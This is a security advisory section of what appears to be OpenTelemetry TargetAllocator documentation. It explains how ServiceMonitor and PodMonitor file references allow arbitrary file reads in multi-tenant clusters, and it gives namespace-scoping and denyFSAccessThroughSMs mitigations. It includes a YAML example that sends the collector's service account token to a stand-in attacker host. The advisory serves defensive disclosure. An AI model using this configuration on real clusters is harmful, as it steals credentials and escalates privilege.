# Security: arbitrary file access through Service/Pod Monitors

> [!WARNING]
> By default, whoever can create a Service or Pod Monitor that your TargetAllocator selects can read
> arbitrary files out of the **collector's** pod — including its service account token and any mounted
> secret — and have the contents sent to an address of their choosing. In a multi-tenant cluster,
> where creating a monitor is a namespaced permission but the collector's service account is
> cluster-privileged, this is a privilege escalation path. Read this section before enabling
> `prometheusCR` on a cluster with untrusted tenants.

Service and Pod Monitor endpoints can reference files on disk, through `bearerTokenFile` and through `tlsConfig`'s `caFile`, `certFile` and `keyFile`. Those paths are resolved by the **collector** at scrape time, against the collector's own pod filesystem — not against the namespace the monitor was created in.

This is allowed by default, matching the Prometheus Operator's `arbitraryFSAccessThroughSMs` default. Common setups depend on it: scraping the Kubernetes API server, the kubelet, or other in-cluster endpoints generally means pointing `bearerTokenFile` at `/var/run/secrets/kubernetes.io/serviceaccount/token`.

The tradeoff is that anyone able to create a monitor your TargetAllocator selects can read any single-line file in the collector's pod and have its contents sent to an address they choose, by combining a file reference with `relabelings`:

```yaml
# Sends the collector's service account token to an arbitrary address.
endpoints:
  - port: metrics
    bearerTokenFile: /var/run/secrets/kubernetes.io/serviceaccount/token
    relabelings:
      - targetLabel: __address__
        replacement: attacker.example.svc.cluster.local:8080
```

This is worth attention in multi-tenant clusters. Creating a ServiceMonitor is a namespaced operation that is often granted broadly (the built-in `edit` ClusterRole includes it), the collector's service account is usually far more privileged than the tenant, and the default `serviceMonitorNamespaceSelector: {}` selects monitors from *every* namespace.

Two ways to address it, which can be combined:

**Restrict which monitors are selected.** Scope `serviceMonitorNamespaceSelector` — and its `podMonitorNamespaceSelector`, `probeNamespaceSelector` and `scrapeConfigNamespaceSelector` siblings — to namespaces whose monitor authors you trust, rather than leaving them at `{}`.

**Reject file references outright.** Set `denyFSAccessThroughSMs`, the equivalent of the Prometheus Operator's `arbitraryFSAccessThroughSMs: Deny`:

```yaml
prometheusCR:
  enabled: true
  denyFSAccessThroughSMs: true
```

Every scrape config generated from an endpoint that references a file is then dropped, and a warning naming the job and the offending field is logged. Other endpoints of the same monitor are unaffected. Standalone target allocators use `deny_fs_access_through_sms: true` in the config file instead.

Note that enabling this also breaks monitors that legitimately need file-based credentials, API server and kubelet scraping among them. Those endpoints must move to a secret-based credential — see [Service / Pod monitor endpoint credentials](README.md#service--pod-monitor-endpoint-credentials) — or the setting has to stay off.
